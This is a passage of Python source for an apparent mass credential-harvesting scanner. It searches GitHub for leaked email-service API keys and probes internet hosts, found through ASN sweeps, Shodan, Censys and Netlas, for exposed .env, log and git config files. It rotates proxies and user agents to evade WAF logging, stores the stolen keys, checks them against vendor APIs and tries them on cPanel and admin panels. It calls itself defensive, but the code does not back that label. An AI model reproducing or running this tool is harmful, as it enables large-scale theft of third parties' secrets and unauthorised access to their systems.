    "AWS_ACCESS_KEY_ID filename:.env",
    "AWS_KEY_ID filename:.env",
    "SES_KEY filename:.env",
    "MAIL_MAILER=ses filename:.env",

    # ── Mailgun ──────────────────────────────────────────────────────────────
    '"key-" MAILGUN filename:.env',
    "MAILGUN_API_KEY filename:.env",
    "MAILGUN_SECRET filename:.env",

    # ── Brevo / Sendinblue ───────────────────────────────────────────────────
    '"xkeysib-" filename:.env',
    "BREVO_API_KEY filename:.env",
    "SENDINBLUE_API_KEY filename:.env",

    # ── Sending domains ──────────────────────────────────────────────────────
    "RESEND_DOMAIN filename:.env",
    "MAIL_FROM_ADDRESS filename:.env",
    "MAIL_FROM_DOMAIN filename:.env",
    "SENDER_DOMAIN filename:.env",
]


async def run_github_scan(
    token: str,
    conn: sqlite3.Connection,
    queries: Optional[list[str]] = None,
    proxy_mgr: Optional[ProxyManager] = None,
) -> tuple[int, int]:
    """Search GitHub code for exposed API keys and sending domains.

    Uses the GitHub code search API with text-match snippets so we can
    extract keys without fetching every raw file (saves API quota).
    Returns (new_findings, duplicates).
    """
    if queries is None:
        queries = _GITHUB_QUERIES

    own_pm = proxy_mgr is None
    pm = proxy_mgr or ProxyManager()
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3.text-match+json",
        "X-GitHub-Api-Version": "2022-11-28",
    }

    new_total = dupe_total = 0
    seen_urls: set[str] = set()

    try:
        for query in queries:
            print(f"[github] Searching: {query!r}", flush=True)
            page = 1
            while page <= 10:
                params = urllib.parse.urlencode({
                    "q": query, "per_page": 30, "page": page,
                })
                url = f"{_GITHUB_API}/search/code?{params}"
                try:
                    async with pm.request(
                        "GET", url, headers=headers,
                        timeout=aiohttp.ClientTimeout(total=20),
                    ) as resp:
                        if resp.status == 401:
                            print("[github] Invalid token — aborting", flush=True)
                            return new_total, dupe_total
                        if resp.status == 403:
                            body = await resp.text()
                            if "rate limit" in body.lower():
                                print("[github] Rate limit hit — stopping this query", flush=True)
                            break
                        if resp.status == 422:
                            break  # query not supported
                        if resp.status != 200:
                            print(f"[github] HTTP {resp.status}", flush=True)
                            break

                        data = await resp.json()
                        items = data.get("items", [])
                        if not items:
                            break

                        for item in items:
                            html_url = item.get("html_url", "")
                            repo = item.get("repository", {}).get("full_name", "")
                            if html_url in seen_urls:
                                continue
                            seen_urls.add(html_url)

                            # Collect all text fragments from this file's matches
                            fragments = " ".join(
                                m.get("fragment", "")
                                for m in item.get("text_matches", [])
                            )
                            if not fragments:
                                continue

                            # Extract credentials using existing detectors
                            creds = extract_laravel_creds(fragments)
                            domain = extract_domain(fragments) or (repo.split("/")[0] if repo else "")

                            vendors_found = []
                            for vendor, keys in creds.items():
                                if vendor in ("smtp_vars", "is_laravel"):
                                    continue
                                for key in keys:
                                    is_new = save_finding(
                                        conn,
                                        source=f"github:{repo}",
                                        url=html_url,
                                        resend_key=key,
                                        linked_domain=domain or None,
                                        file_path=item.get("path", ""),
                                        raw_context=fragments[:2000],
                                        vendor=vendor,
                                    )
                                    if is_new:
                                        new_total += 1
                                        vendors_found.append(vendor)
                                    else:
                                        dupe_total += 1

                            if vendors_found:
                                print(
                                    f"[github] *** HIT: {html_url} "
                                    f"[{', '.join(set(vendors_found))}]",
                                    flush=True,
                                )

                        if len(items) < 30:
                            break
                        page += 1
                        # GitHub search: 30 req/min authenticated → ~2s between pages
                        await asyncio.sleep(2)

                except Exception as e:
                    print(f"[github] Error on {query!r} page {page}: {e}", flush=True)
                    break

            # Between queries — stay well under rate limit
            await asyncio.sleep(3)

    finally:
        if own_pm:
            await pm.close()

    print(f"[github] Done — {new_total} new finding(s), {dupe_total} duplicate(s).", flush=True)
    return new_total, dupe_total


# ── probe ──────────────────────────────────────────────────────────────────────

# Pool of realistic browser UAs — randomly chosen per request so a target's WAF
# logs don't see 50 hits from one identical UA.
_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.2151.97",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
]

# Per-host caps stop us from hammering one target. 5 in-flight per host is
# gentle enough to avoid 429/ban while still parallel across many hosts.
PER_HOST_LIMIT = 5
# After this many consecutive network failures (timeout / connection refused /
# DNS) against one host, mark it dead and short-circuit its remaining probes.
# HTTP responses (200/404/403/etc) reset the counter — those mean host is alive.
HOST_FAIL_THRESHOLD = 3


async def run_laravel_env_probe(
    targets: list[str],
    paths: list[str],
    concurrency: int = 10,
    proxy_mgr: Optional[ProxyManager] = None,
    fast_fail: bool = False,
    on_host_done: Optional[Callable[[str], None]] = None,
) -> AsyncIterator[tuple[str, str]]:
    """Probe owned targets for exposed .env files.  Yields (probe_url, env_text).

    Smart scheme: tries https first; only falls back to http on connection
    failure (not on 200/404 — any HTTP response means the scheme is fine).
    Halves probe count for HTTPS-only hosts.

    Uses a bounded producer/worker-pool pattern — memory stays flat regardless
    of probe count, so 100k targets × 40 paths = 4M probes works without OOM.
    """
    own_pm = proxy_mgr is None
    pm = proxy_mgr or ProxyManager()
    host_sems: dict[str, asyncio.Semaphore] = {}
    host_state: dict[str, dict] = defaultdict(
        lambda: {"failures": 0, "dead": False, "skipped": 0}
    )

    # Normalise hosts once; do NOT materialise the full host×path cross product.
    norm_targets: list[str] = []
    for target in targets:
        host = target.strip().rstrip("/")
        if "://" in host:
            host = host.split("://", 1)[1]
        if host:
            norm_targets.append(host)
    total = len(norm_targets) * len(paths)

    if pm.total == 1:
        proxy_note = f" via proxy {pm.urls[0].split('@')[-1]}"
    elif pm.total > 1:
        proxy_note = f" via {pm.alive_count}/{pm.total} proxies (rotating)"
    else:
        proxy_note = ""
    if proxy_note:
        print(f"[proxy] Using{proxy_note}", flush=True)
    if pm.total > 0 and concurrency > 5:
        print(
            f"[proxy] TIP: residential rotating proxies handle ~5 concurrent "
            f"connections well — consider --concurrency 5 (current: {concurrency})",
            flush=True,
        )

    # Bounded queues — back-pressure keeps memory flat at large probe counts.
    work_q: asyncio.Queue = asyncio.Queue(maxsize=concurrency * 4)
    result_q: asyncio.Queue = asyncio.Queue(maxsize=concurrency * 2)

    # Residential rotating proxies (e.g. NodeMaven) assign a new exit IP per
    # TCP connection, which takes 5-30 s. Raise total to 45 s so the CONNECT
    # handshake has time to complete before we give up on the host entirely.
    # sock_connect (raw TCP to the proxy host itself) stays tight at 8 s —
    # if gate.nodemaven.com:8080 is truly unreachable we know fast without
    # burning the full 45 s per-attempt.
    if pm.total > 0:
        _probe_timeout = aiohttp.ClientTimeout(total=45, sock_connect=8)
    else:
        _probe_timeout = aiohttp.ClientTimeout(total=5, sock_connect=3)

    # fast_fail=True: mark a host dead after the first path failure instead of
    # waiting for HOST_FAIL_THRESHOLD failures. Safe for fast-paths mode — a
    # host that can't serve /.env won't serve /.env.bak either. Skips up to
    # (len(paths)-1) × 2 scheme attempts per dead host, cutting wasted time.
    _fail_threshold = 1 if fast_fail else HOST_FAIL_THRESHOLD
    # In fast_fail mode also lower per-host concurrency to 1: with threshold=1
    # the host is dead after one failed path, so running 3 paths concurrently
    # means 2 wasted probes. Sequential per-host probing eliminates that waste.
    _per_host = 1 if fast_fail else PER_HOST_LIMIT

    async def _try_one(
        url: str, permissive: bool = False, raw: bool = False
    ) -> tuple[Optional[int], Optional[str]]:
        """Returns (status, text). text populated on 200 with credential content.
        permissive=True: loose log-file filter. raw=True: no content filter (config files)."""
        max_bytes = 2_000_000 if permissive else (500_000 if raw else _ENV_MAX_BYTES + 1)
        async with pm.request(
            "GET", url,
            headers={"User-Agent": random.choice(_USER_AGENTS)},
            timeout=_probe_timeout,
            allow_redirects=True,
            max_redirects=3,
        ) as resp:
            if resp.status == 200:
                raw_bytes = await resp.content.read(max_bytes)
                text = raw_bytes.decode("utf-8", errors="replace")
                if raw:
                    return resp.status, text
                elif permissive:
                    if _contains_smtp_creds(text):
                        return resp.status, text
                else:
                    if _looks_like_env_file(text):
                        return resp.status, text
            return resp.status, None

    async def _probe(host: str, path: str) -> None:
        state = host_state[host]
        if state["dead"]:
            state["skipped"] += 1
            await result_q.put(("done", host, None))
            return
        host_sem = host_sems.setdefault(host, asyncio.Semaphore(_per_host))
        async with host_sem:
            if state["dead"]:
                state["skipped"] += 1
                await result_q.put(("done", None, None))
                return
            permissive = _is_log_path(path)
            is_cfg = _is_config_file_path(path)
            # Smart scheme order:
            #   - IP targets: HTTP first (most IPs lack a valid TLS cert; we'd
            #     waste a TLS handshake on every probe). Falls back to HTTPS.
            #   - Hostname targets: HTTPS first (modern web is HTTPS-by-default
            #     and many hosts redirect HTTP→HTTPS, costing a round-trip).
            schemes = ("http", "https") if _is_ip(host) else ("https", "http")
            for scheme in schemes:
                url = f"{scheme}://{host}{path}"
                try:
                    status, text = await _try_one(url, permissive, raw=is_cfg)
                    state["failures"] = 0  # any HTTP response = host alive
                    if status == 200 and text:
                        await result_q.put(("hit", url, text))
                    else:
                        await result_q.put(("alive", None, None))
                    break  # got an HTTP response — don't try alternate scheme
                except RuntimeError as e:
                    # All proxies exhausted — this is a pool-level failure, not
                    # a target failure. Re-raise so _worker logs it and the probe
                    # is counted as done without blaming the target.
                    if "proxies" in str(e).lower():
                        raise
                    continue
                except Exception:
                    # connection refused / timeout / TLS error — try next scheme
                    continue
            else:
                # Both schemes failed → genuine network failure
                state["failures"] += 1
                if state["failures"] >= _fail_threshold and not state["dead"]:
                    state["dead"] = True  # silently; summary printed at end
        await result_q.put(("done", host, None))

    async def _worker() -> None:
        while True:
            item = await work_q.get()
            if item is None:
                work_q.task_done()
                break
            host, path = item
            try:
                await _probe(host, path)
            except RuntimeError as e:
                if "proxies" in str(e).lower():
                    print(f"[proxy] FATAL: {e} — stopping scan", flush=True)
                    # Drain the work queue so the producer and other workers
                    # can exit rather than blocking on a full work_q forever.
                    while not work_q.empty():
                        try:
                            work_q.get_nowait()
                            work_q.task_done()
                        except asyncio.QueueEmpty:
                            break
                await result_q.put(("done", host, None))
            except Exception:
                # Probe internals already swallow per-request errors; this
                # guards against unexpected bugs so one rogue probe doesn't
                # stall the queue counter forever.
                await result_q.put(("done", host, None))
            finally:
                work_q.task_done()

    async def _producer() -> None:
        for host in norm_targets:
            for path in paths:
                await work_q.put((host, path))
        # One sentinel per worker — workers exit cleanly without cancellation.
        for _ in range(concurrency):
            await work_q.put(None)

    workers = [asyncio.create_task(_worker()) for _ in range(concurrency)]
    producer = asyncio.create_task(_producer())

    try:
        done = 0
        hits = 0
        alive_responses = 0  # hosts that gave any HTTP response (proxy is reaching targets)
        _t_start = asyncio.get_event_loop().time()
        _t_last_print = _t_start
        _HEARTBEAT = 15.0  # seconds between progress lines regardless of count
        # Per-host done counter so on_host_done fires exactly once per host
        # after all len(paths) probes for that host have completed. Lets the
        # caller checkpoint progress incrementally — stopping mid-scan no
        # longer wastes already-probed work on the next run.
        host_done_counter: defaultdict[str, int] = defaultdict(int)
        _paths_per_host = len(paths)

        def _fmt_heartbeat(label: str) -> str:
            now = asyncio.get_event_loop().time()
            elapsed = now - _t_start
            rate = done / elapsed if elapsed > 0 else 0
            dead_now = sum(1 for s in host_state.values() if s["dead"])
            pct = done * 100 // total if total else 0
            eta_s = int((total - done) / rate) if rate > 0 else 0
            eta = f"{eta_s//3600}h{(eta_s%3600)//60}m" if eta_s else "?"
            # alive_responses > 0 confirms the proxy is actually reaching targets
            proxy_ok = f", {alive_responses:,} got HTTP" if alive_responses else ", 0 HTTP yet"
            # When a proxy is configured, surface the route counter so the user
            # has direct confirmation requests are flowing through the proxy
            # (vs silently going direct or failing before connect).
            if pm.total > 0:
                proxy_ok += f", {pm.requests_routed:,} via proxy"
            return (
                f"[laravel] {label}: {done:,}/{total:,} ({pct}%)"
                f" — {hits} hit(s), {dead_now:,} dead{proxy_ok}"
                f", {rate:.1f} probe/s, ETA ~{eta}"
            )

        while done < total:
            try:
                kind, url, text = await asyncio.wait_for(
                    result_q.get(), timeout=_HEARTBEAT
                )
            except asyncio.TimeoutError:
                now = asyncio.get_event_loop().time()
                elapsed = now - _t_start
                print(_fmt_heartbeat("Heartbeat"), flush=True)
                # Stall detector: if a proxy is configured but nothing has been
                # routed through it after 90 s, the proxy is almost certainly
                # unreachable or mis-configured — warn the user early.
                if pm.total > 0 and pm.requests_routed == 0 and elapsed >= 90:
                    print(
                        f"[proxy] WARNING: 0 requests routed after {int(elapsed)}s "
                        "— proxy may be unreachable, credentials wrong, or "
                        f"concurrency ({concurrency}) too high for a single "
                        "residential proxy. Try --concurrency 3",
                        flush=True,
                    )
                _t_last_print = now
                continue

            if kind == "done":
                done += 1
                # Track per-host completion so on_host_done can be called
                # exactly once when all paths for a host have completed.
                if url is not None and on_host_done is not None:
                    host_done_counter[url] += 1
                    if host_done_counter[url] >= _paths_per_host:
                        del host_done_counter[url]  # free memory eagerly
                        try:
                            on_host_done(url)
                        except Exception as e:
                            print(f"[laravel] on_host_done callback error: {e}", flush=True)
                now = asyncio.get_event_loop().time()
                if now - _t_last_print >= _HEARTBEAT:
                    _t_last_print = now
                    print(_fmt_heartbeat("Progress"), flush=True)
            elif kind == "alive":
                # _probe also puts ("done") for this slot — only track the count
                alive_responses += 1
            else:  # "hit"
                hits += 1
                alive_responses += 1
                yield url, text
        await producer
        await asyncio.gather(*workers, return_exceptions=True)

        skipped_total = sum(s["skipped"] for s in host_state.values())
        dead_hosts = sum(1 for s in host_state.values() if s["dead"])
        if skipped_total:
            print(
                f"[laravel] short-circuited {skipped_total} probe(s) across "
                f"{dead_hosts:,} dead host(s)",
                flush=True,
            )
        if pm.total > 0:
            print(
                f"[proxy] Final tally — {pm.requests_routed:,} request(s) routed "
                f"through {pm.alive_count}/{pm.total} live proxy/proxies",
                flush=True,
            )
    finally:
        # Defensive cleanup on early exit (caller break / exception).
        if not producer.done():
            producer.cancel()
        for w in workers:
            if not w.done():
                w.cancel()
        await asyncio.gather(producer, *workers, return_exceptions=True)
        if own_pm:
            await pm.close()


def _redact(key: str, keep: int = 10) -> str:
    """Redact a credential for logging — keep first N chars + ellipsis."""
    return key[:keep] + "…" if len(key) > keep else key


_VENDOR_ORDER = (
    "resend", "sendgrid", "mailgun", "brevo", "postmark", "mailjet", "ses", "smtp", "db",
)


async def _laravel_pipeline(
    targets: list[str],
    paths: list[str],
    conn: sqlite3.Connection,
    counters: dict,
    concurrency: int,
    proxy_mgr: Optional[ProxyManager] = None,
    shodan_key: Optional[str] = None,
    censys_id: Optional[str] = None,
    censys_secret: Optional[str] = None,
    netlas_key: Optional[str] = None,
    enable_crtsh: bool = False,
    enable_reverse_dns: bool = False,
    enable_verify: bool = False,
    auto_expand_ips: bool = False,
    asns: Optional[list[str]] = None,
    ipinfo_token: Optional[str] = None,
    fast_paths: Optional[bool] = None,  # None=auto, True=force fast, False=force all
    max_hosts_per_run: int = _DEFAULT_MAX_HOSTS_PER_RUN,
    enable_tcp_prefilter: bool = True,
    enable_subnet_expand: bool = True,
) -> None:
    """One-shot defensive .env probe.  Runs once and returns.

    Steps:
      0. ASN resolution — convert AS numbers to IPv4 CIDR prefixes.
      1. Expand CIDR blocks; optionally resolve PTR records on IPs.
      2. crt.sh subdomain enumeration on bare-domain targets (if enabled).
      3. Shodan / Censys discovery (if API keys provided).
      4. Deduplicate and filter against probed_hosts DB.
      5. Probe remaining targets, save findings.
      6. Verify keys against vendor APIs (if enabled).
      7. Record probed hosts so they're skipped next time.
    """
    cfg = load_config()

    # Pre-flight: show resume state so the user knows the checkpoint system is
    # active — same ASN/IP-range re-runs will skip already-probed hosts.
    probed_count = conn.execute("SELECT COUNT(*) FROM probed_hosts").fetchone()[0]
    if probed_count:
        print(
            f"[laravel] Resume DB: {probed_count:,} host(s) already probed in "
            "previous runs — they will be skipped automatically.",
            flush=True,
        )

    # 0. ASN resolution — resolve each AS number to IPv4 CIDR prefixes.
    if asns:
        print(f"[asn] Resolving {len(asns)} ASN(s) to IP prefix ranges …", flush=True)
        asn_prefixes: list[str] = []
        for asn in asns:
            prefixes = await resolve_asn_prefixes(
                asn,
                proxy_mgr=None,  # always direct — BGPView/RIPEstat are public APIs,
                                 # not scan targets; routing through the scan proxy
                                 # breaks resolution when the proxy can't reach them.
                ipinfo_token=ipinfo_token,
            )
            asn_prefixes.extend(prefixes)
        if asn_prefixes:
            total_ips = sum(
                ipaddress.ip_network(p, strict=False).num_addresses
                for p in asn_prefixes
                if _safe_prefix(p)
            )
            print(
                f"[asn] {len(asn_prefixes)} prefix(es) → up to {total_ips:,} IPs",
                flush=True,
            )
            targets = list(targets) + asn_prefixes
        else:
            print("[asn] No prefixes resolved — check ASN numbers and connectivity.", flush=True)

    # Capture CIDR blocks from the combined target list (original inputs +
    # ASN-resolved prefixes) before expansion — used as Netlas IP filters so
    # discovery results are scoped to the ranges being scanned, not global noise.
    _netlas_cidr_filters: list[str] = []
    for _t in targets:
        _t = _t.strip()
        if "/" in _t:
            try:
                ipaddress.ip_network(_t, strict=False)
                _netlas_cidr_filters.append(_t)
            except ValueError:
                pass

    # 1. CIDR expansion (optionally widening bare IPs to their /24 subnet)
    all_targets = expand_targets(targets, auto_expand_ips=auto_expand_ips)

    # 2. Reverse DNS — replace bare IPs with resolved hostnames where possible
    if enable_reverse_dns:
        ips = [t for t in all_targets if _is_ip(t)]
        if ips:
            print(f"[ptr] Resolving PTR records for {len(ips)} IP(s) …", flush=True)
            resolved = await resolve_ptr_records(ips)
            ip_to_host = dict(zip(ips, resolved))
            all_targets = [ip_to_host.get(t, t) for t in all_targets]

    # 3. crt.sh subdomain enumeration on the bare-domain inputs
    if enable_crtsh:
        bare_domains = [t for t in targets if _is_bare_domain(t)]
        if bare_domains:
            print(f"[crtsh] Enumerating subdomains for {len(bare_domains)} domain(s) …", flush=True)
            crtsh_subs: list[str] = []
            async for sub in run_crtsh_enum(bare_domains, proxy_mgr=proxy_mgr):
                crtsh_subs.append(sub)
            # Sort dev/staging-prefixed subdomains first so they survive any
            # max-hosts-per-run truncation. Production hosts roll over to the
            # next run via the probed_hosts checkpoint.
            crtsh_subs.sort(key=lambda h: not _is_dev_subdomain(h))
            dev_count = sum(1 for s in crtsh_subs if _is_dev_subdomain(s))
            if dev_count:
                print(
                    f"[crtsh] {dev_count}/{len(crtsh_subs)} subdomain(s) match "
                    "dev/staging priority — probed first",
                    flush=True,
                )
            all_targets.extend(crtsh_subs)

    # 4. Shodan discovery
    if shodan_key:
        shodan_queries = cfg.get("shodan_queries", ["app:laravel"])
        print(
            f"[shodan] Querying for targets ({len(shodan_queries)} query/queries) …",
            flush=True,
        )
        shodan_hosts: list[str] = []
        async for host in run_shodan_search(shodan_key, shodan_queries, proxy_mgr=proxy_mgr):
            shodan_hosts.append(host)
        print(f"[shodan] {len(shodan_hosts)} host(s) discovered", flush=True)
        all_targets.extend(shodan_hosts)

    # 5. Censys discovery
    if censys_id and censys_secret:
        censys_queries = cfg.get("censys_queries", ["services.software.product: laravel"])
        print(
            f"[censys] Querying for targets ({len(censys_queries)} query/queries) …",
            flush=True,
        )
        censys_hosts: list[str] = []
        async for host in run_censys_search(censys_id, censys_secret, censys_queries, proxy_mgr=proxy_mgr):
            censys_hosts.append(host)
        print(f"[censys] {len(censys_hosts)} host(s) discovered", flush=True)
        all_targets.extend(censys_hosts)

    # 6. Netlas discovery
    if netlas_key:
        netlas_queries = cfg.get("netlas_queries", ['http.body:"laravel_session"'])
        cidr_note = (
            f" (IP-filtered to {len(_netlas_cidr_filters)} CIDR(s))"
            if _netlas_cidr_filters else " (global — no CIDR in targets)"
        )
        print(
            f"[netlas] Querying for targets ({len(netlas_queries)} query/queries){cidr_note} …",
            flush=True,
        )
        netlas_hosts: list[str] = []
        async for host in run_netlas_search(
            netlas_key, netlas_queries, proxy_mgr=proxy_mgr,
            ip_filters=_netlas_cidr_filters or None,
        ):
            netlas_hosts.append(host)
        print(f"[netlas] {len(netlas_hosts)} host(s) discovered", flush=True)
        all_targets.extend(netlas_hosts)

    # 7. Normalize + dedup within this run's combined list
    seen_norm: dict[str, str] = {}
    for t in all_targets:
        norm = _normalize_host(t)
        if norm and norm not in seen_norm:
            seen_norm[norm] = t
    all_targets = list(seen_norm.values())

    # 7. Filter against previously probed hosts in DB
    probed: set[str] = {
        row[0] for row in conn.execute("SELECT host FROM probed_hosts").fetchall()
    }
    new_targets = [t for t in all_targets if _normalize_host(t) not in probed]
    skipped_count = len(all_targets) - len(new_targets)

    if skipped_count:
        pct = skipped_count * 100 // len(all_targets) if all_targets else 0
        print(
            f"[laravel] Resuming — {skipped_count:,} of {len(all_targets):,} host(s) "
            f"already probed ({pct}%). Continuing with {len(new_targets):,} new host(s). "
            "Use Clear History to re-scan from scratch.",
            flush=True,
        )

    if not new_targets:
        print(
            "[laravel] No new targets to scan. "
            "Use Clear History to re-probe previously scanned hosts.",
            flush=True,
        )
        # Still verify any unverified rows from prior runs.
        if enable_verify:
            await verify_findings_live(conn, proxy_mgr=proxy_mgr)
        return

    # 7.5. TCP pre-filter: for IP-heavy target sets, eliminate dark addresses
    #      with a fast async port scan before queuing HTTP probes.
    #      Only activates when >25% of remaining targets are raw IPs and the
    #      list has >1 000 IPs — hostname inputs already imply a reachable
    #      server, so this is specifically for CIDR/ASN sweeps.
    #      Side-effect bonus: the filtered list is often below the fast-paths
    #      threshold (50 000), so all 51 paths are probed instead of just 3.
    if enable_tcp_prefilter:
        ip_count = sum(1 for t in new_targets if _is_ip(t))
        if ip_count > 1_000 and ip_count / max(len(new_targets), 1) > 0.25:
            new_targets = await tcp_prefilter(new_targets)
            if not new_targets:
                print("[prefilter] All hosts eliminated — nothing to probe.", flush=True)
                if enable_verify:
                    await verify_findings_live(conn, proxy_mgr=proxy_mgr)
                return

    # 8. Per-run host cap — keeps each session time-bounded.
    #    probed_hosts checkpoint means re-running picks up where we left off.
    remaining_after_cap = 0
    if max_hosts_per_run > 0 and len(new_targets) > max_hosts_per_run:
        remaining_after_cap = len(new_targets) - max_hosts_per_run
        new_targets = new_targets[:max_hosts_per_run]
        print(
            f"[laravel] Capping this run to {max_hosts_per_run:,} hosts "
            f"({remaining_after_cap:,} remaining — re-run to continue). "
            "Pass --max-hosts-per-run 0 to disable the cap.",
            flush=True,
        )

    # 9. Choose active probe paths.
    #    Fast-paths mode uses only the 3 highest-yield paths, cutting probe
    #    volume by ~93 %. Auto-enabled when new_targets exceeds threshold;
    #    can also be forced on/off via --fast-paths / --no-fast-paths.
    auto_fast = len(new_targets) > _FAST_PATHS_THRESHOLD
    if fast_paths is True:
        use_fast = True
    elif fast_paths is False:
        use_fast = False
    else:  # None — auto
        use_fast = auto_fast
    active_paths = _ESSENTIAL_PATHS if use_fast else paths
    if use_fast and fast_paths is None:
        print(
            f"[laravel] Auto-enabling fast paths ({len(active_paths)} essential paths) "
            f"— {len(new_targets):,} targets exceeds threshold of {_FAST_PATHS_THRESHOLD:,}. "
            "Change Path mode to 'All paths' in the UI (or --no-fast-paths) to probe all.",
            flush=True,
        )
    elif fast_paths is True:
        print(
            f"[laravel] Fast-paths mode: probing {len(active_paths)} essential paths only.",
            flush=True,
        )
    elif fast_paths is False:
        print(
            f"[laravel] All-paths mode: probing all {len(active_paths)} configured paths.",
            flush=True,
        )

    total_probes = len(new_targets) * len(active_paths)
    print("=" * 60, flush=True)
    print(
        f"[laravel] Probing {len(new_targets):,} target(s) × {len(active_paths)} path(s) "
        f"= {total_probes:,} probes — authorised use only",
        flush=True,
    )
    print("=" * 60, flush=True)

    # 10. Probe — checkpoint each completed host to probed_hosts in batches
    #     of 50 so a stop-mid-scan loses at most 50 hosts of progress.
    #     Wrapped in try/finally so the checkpoint flushes even on SIGTERM,
    #     CancelledError, or unhandled exception — critical for resume.
    hits = 0
    _probed_batch: list[tuple[str, str]] = []
    _PROBED_BATCH_SIZE = 50

    def _flush_probed_batch() -> int:
        if not _probed_batch:
            return 0
        n = len(_probed_batch)
        conn.executemany(
            "INSERT OR REPLACE INTO probed_hosts (host, probed_at) VALUES (?, ?)",
            _probed_batch,
        )
        conn.commit()
        _probed_batch.clear()
        return n

    def _checkpoint_host(host: str) -> None:
        _probed_batch.append((_normalize_host(host), datetime.now(timezone.utc).isoformat()))
        if len(_probed_batch) >= _PROBED_BATCH_SIZE:
            _flush_probed_batch()

    template_hits = 0
    hit_ips: set[str] = set()  # bare IPs that returned real .env hits (for subnet expand)

    try:
        async for probe_url, text in run_laravel_env_probe(
            new_targets, active_paths, concurrency, proxy_mgr=proxy_mgr,
            fast_fail=use_fast, on_host_done=_checkpoint_host,
        ):
            probe_path = "/" + probe_url.split("://", 1)[1].partition("/")[2]
            host_part  = probe_url.split("://", 1)[1].split("/")[0]
            bare_host  = host_part.split(":")[0]

            # Git config file — extract tokens/remote URLs from .git/HEAD and .git/config
            if _is_config_file_path(probe_path):
                cfg_findings = _extract_config_file_creds(text, probe_path)
                if cfg_findings:
                    hits += 1
                    print(f"\n[laravel] *** GIT EXPOSED: {probe_url} ***", flush=True)
                    for key, linked_domain, vendor in cfg_findings:
                        domain = linked_domain or (host_part if not _is_ip(host_part) else None)
                        is_new = save_finding(
                            conn,
                            source="laravel/git-probe",
                            url=probe_url,
                            resend_key=key,
                            linked_domain=domain,
                            file_path=probe_path,
                            raw_context=text[:500],
                            vendor=vendor,
                        )
                        tag = "NEW" if is_new else "dup"
                        print(f"[laravel]   [{vendor}/{tag}] {_redact(key)}", flush=True)
                        if is_new:
                            counters["found"] += 1
                if _is_ip(bare_host):
                    hit_ips.add(bare_host)
                counters["scanned"] += 1
                continue

            creds = extract_laravel_creds(text)
            is_template = _is_template_path(probe_url)

            if is_template:
                # Template files (.env.example etc) are developer scaffolding —
                # passwords are always placeholders. Log quietly, don't count as hits.
                template_hits += 1
                has_any_cred = any(creds.get(v) for v in _VENDOR_ORDER)
                if has_any_cred:
                    # Rare: template file somehow has a real-looking key — promote it.
                    label = "Laravel .env" if creds["is_laravel"] else ".env"
                    print(f"\n[laravel] *** {label} EXPOSED (template): {probe_url} ***", flush=True)
                    hits += 1
                else:
                    print(f"[laravel] (template) {probe_url}", flush=True)
                    # Still save any cred-adjacent context for audit, but don't inflate hit count
                    if creds["smtp_vars"]:
                        print(
                            f"[laravel]   ⚠ template SMTP vars (placeholders): "
                            f"{', '.join(sorted(creds['smtp_vars']))}",
                            flush=True,
                        )
                    continue
            else:
                hits += 1
                label = "Laravel .env" if creds["is_laravel"] else ".env"
                print(f"\n[laravel] *** {label} EXPOSED: {probe_url} ***", flush=True)

            host = probe_url.split("://", 1)[1].split("/")[0]
            bare_host = host.split(":")[0]
            if _is_ip(bare_host) and not is_template:
                hit_ips.add(bare_host)
            # Use domain from env content; fall back to probe host only if it's
            # a real hostname — storing a raw IP as linked_domain is misleading.
            domain = extract_domain(text) or (host if not _is_ip(host) else None)

            for vendor in _VENDOR_ORDER:
                for key in creds.get(vendor, []):
                    is_new = save_finding(
                        conn,
                        source="laravel/env-probe",
                        url=probe_url,
                        resend_key=key,
                        linked_domain=domain,
                        file_path=probe_url,
                        raw_context=text[:2000],
                        vendor=vendor,
                    )
                    tag = "NEW" if is_new else "dup"
                    print(f"[laravel]   [{vendor}/{tag}] {_redact(key)}", flush=True)
                    if is_new:
                        counters["found"] += 1
                        if domain:
                            asyncio.create_task(
                                _check_and_store_domain_alive(conn, key, domain, proxy_mgr)
                            )

            # Only warn about raw SMTP vars if we couldn't extract usable creds —
            # e.g. password was empty/placeholder.
            if creds["smtp_vars"] and not creds["smtp"]:
                print(
                    f"[laravel]   ⚠ SMTP vars present (password placeholder/empty): "
                    f"{', '.join(sorted(creds['smtp_vars']))}",
                    flush=True,
                )

            # Auto-check cPanel/WHM and admin panels with credentials from this .env
            if not is_template:
                asyncio.create_task(
                    _auto_cpanel_check(bare_host, text[:2000], probe_url, conn, proxy_mgr)
                )
                asyncio.create_task(_auto_admin_check(bare_host, conn, proxy_mgr, raw_env=text[:2000]))

            counters["scanned"] += 1
    finally:
        # Always flush — covers normal completion, SIGTERM, asyncio.CancelledError,
        # and unhandled exceptions. Without this, anything in the in-memory batch
        # is lost on abrupt termination, defeating the resume guarantee.
        flushed = _flush_probed_batch()
        if flushed:
            print(f"[laravel] Checkpoint flushed: {flushed} host(s) saved to DB", flush=True)

    # 11. Subnet expansion — deep-scan /24 neighbors of confirmed hit IPs.
    # If one IP in a /24 had .env exposed, the neighboring servers (staging,
    # backup, mail) were often deployed by the same team with the same config.
    # We bypass the TCP prefilter here: a hit in the subnet justifies trying
    # every neighbor directly.
    subnet_hits = 0
